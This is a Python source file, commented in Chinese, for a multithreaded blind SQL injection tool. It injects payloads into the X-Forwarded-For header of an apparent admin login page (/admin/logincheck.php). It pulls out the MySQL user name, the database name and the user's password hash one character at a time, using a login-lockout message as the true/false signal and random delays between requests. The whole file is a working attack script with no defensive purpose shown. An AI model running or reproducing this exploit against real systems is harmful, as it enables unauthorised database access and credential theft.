"""
    injection 模块的功能：
        注入出 mysql用户名 、mysql用户的密码、mysql的当前库名
    injection 模块提供的类及功能：
        
"""
import requests,re,threading,time,random
class inject(object):

    # 初始化方法
    def __init__(self,url):
        self.keyword = "密码错误次数过多"
        self.url = url+"/admin/logincheck.php"
        self.payloadList =[i for i in range(32,128)]
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
            "Referer":"http://www.t00ls.net"
        }
        #123.10.10.1' or ascii(substr(user(),1))=114
        # 初始化一个list开辟100个空间，用于后面存放data
        list = []
        for i in range(100):
            list.append("")
        self.data = list
        self.lock = threading.Lock()

    # 判断要注入的数据的长度
    def getLen(self,sql):
        for i in range(100):
            if 'select' in sql :
                payload = "123.1.1.1' or {} = {} #".format(sql,i+1)
            else:
                payload = "123.10.10.1' or length({})={} #".format(sql,i+1)
            self.headers['X-Forwarded-For'] = payload
            print("[+] 正在尝试："+self.headers['X-Forwarded-For'])
            try:
                res = requests.post(self.url,headers=self.headers)
                res.encoding = "utf-8"
                #print(self.keyword)
                if self.keyword in res.text :
                    return i+1
            except:
                print("[-] 无法连接到目标站点")
                exit()
        print("[-] 长度大于100位，请检查是否可以注入")
        print()
        return None

    # 注入数据，然后返回，避免代码重复太多
    def dataInject(self,sql,i):
        data = ""
        #print(self.payloadList)
        #for j in self.payloadList:
        j=0
        while True:
            payload = "123.10.10.1' or ascii(substr(({}),{}))={} #".format(
                sql,i+1,self.payloadList[j]
            )
            print("[+] 正在尝试：",payload)
            self.headers['X-Forwarded-For']=payload
            try:
                res = requests.post(self.url,headers=self.headers)
                res.encoding = "utf-8"
                #print(j)
                if self.keyword in res.text:
                    self.lock.acquire()
                    self.data[i] = self.payloadList[j]
                    self.lock.release()
                    break
                elif "用户名或密码错误" in res.text:
                    j=j+1
                if j>=len(self.payloadList):
                    j=0
                time.sleep(random.random())
            except Exception as e:
                print(e)
                print("[+] 请检查站点是否可以连接")


    # 获取用户名
    def getUser(self):
        # 将self.data  初始化为空
        list = []
        for i in range(100):
            list.append("")
        self.data = list

        len = self.getLen("user()")
        if len == None:
            return None
        #print(len)
        username=""
        threads=[]
        for i in range(len):
            thread = threading.Thread(target=self.dataInject,args=("user()",i))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        for i in self.data:
            if i == "":
                break
            else:
                username=username+chr(i)
        re_ = re.compile(r'(.*)@.*')
        self.user = re_.findall(username)[0]
        return username

    # 获取DBName
    def getDBName(self):
        list = []
        for i in range(100):
            list.append("")
        self.data = list
        len = self.getLen("database()")
        dbname = ""
        threads = []
        if len == None:
            return None
        for i in range(len):
            thread = threading.Thread(target=self.dataInject, args=("database()", i))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        for i in self.data:
            if i == "":
                break
            else:
                dbname = dbname + chr(i)
        return dbname
    # 获取mysql user的密码
    def getPass(self):
        # 将self.data  初始化为空
        list = []
        for i in range(100):
            list.append("")
        self.data = list

        payload = "(select length(password) from mysql.user where user='{}' limit 0,1)".format(self.user)
        len = self.getLen(payload)
        if len == None:
            return None
        password = ""
        threads = []
        for i in range(len):
            payload = "select password from mysql.user where user='{}' limit 0,1".format(self.user)
            thread = threading.Thread(target=self.dataInject, args=(payload, i))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        for i in self.data:
            if i == "":
                break
            else:
                password = password + chr(i)
        return password